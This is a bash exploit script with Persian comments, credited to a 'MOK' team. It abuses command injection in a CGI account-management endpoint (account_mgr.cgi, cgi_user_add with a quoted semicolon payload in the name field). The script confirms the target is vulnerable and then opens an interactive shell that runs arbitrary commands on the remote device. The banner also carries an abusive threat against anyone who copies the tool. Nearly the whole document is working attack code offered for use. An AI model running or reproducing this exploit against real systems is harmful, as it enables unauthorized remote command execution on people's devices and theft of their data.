#!/bin/bash

# چاپ بنر
print_banner() {
    echo "
       
         

 __  __   ______   __   __
|  \/  | |  ____| |  \_/  |
| |\/| | | |___   | |\/| |
|_|  |_| |_____| |_|  |_|

mok
# ساخته شده توسط تیم MOK
# هرگونه اسکی از ابزار = پخش شدن فیلم مادر گرامی

                  


                       
    "
}

verify() {
    echo "[!] بررسی اینکه هدف آسیب‌پذیر است ..."
    local verify_string=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 5 | head -n 1)
    local cmd="echo ${verify_string}"
    local encoded_cmd=$(echo "$cmd" | jq -s -R -r @uri)
    local endpoint="/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;${encoded_cmd};%27"

    response=$(curl "${1}${endpoint}" 2>/dev/null)
    
    if [[ "$response" == *"$verify_string"* ]]; then
        echo "[+] آسیب‌پذیر است"
    else
        echo "[-] آسیب‌پذیر نیست"
        echo "[-] خروج ..."
        exit 1
    fi
}

# تابع برای بهره‌برداری از هدف
exploit() {
    while true; do
        read -p "kurtlar-Shell$ " cmd
        
        # بررسی دستور "exit"
        if [[ "$cmd" == "exit" ]]; then
            echo "[!] خروج از حالت اکسپلویت..."
            break
        fi
        
        encoded_cmd=$(echo "$cmd" | jq -s -R -r @uri)
        endpoint="/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;${encoded_cmd};%27"

        response=$(curl "${1}${endpoint}" 2>/dev/null)

        if [ -z "$response" ]; then
            echo "[-] هیچ خروجی دریافت نشد یا دستور نامعتبر است."
            echo "[-] برای خروج '-exit' را وارد کنید."
        else
            echo "$response"
        fi
    done
}

# تابع اصلی
main() {
    # پردازش آرگومان‌ها
    while getopts "u:k" opt; do
        case ${opt} in
            u ) URL=$OPTARG ;;
            k ) IGNORE_CERT=true ;;
            * ) echo "نحوه استفاده: $0 -u <target_url> [-k]" 
                exit 1 ;;
        esac
    done

    if [ -z "$URL" ]; then
        echo "آدرس URL هدف الزامی است. از -u <target_url> استفاده کنید."
        exit 1
    fi

    print_banner
    verify "$URL"

    read -p "[?] آیا می‌خواهید با اکسپلویت ادامه دهید؟ [y/n]: " choice
    if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
        exploit "$URL"
    else
        echo "[!] خداحافظ ..."
        exit 0
    fi
}

main "$@"
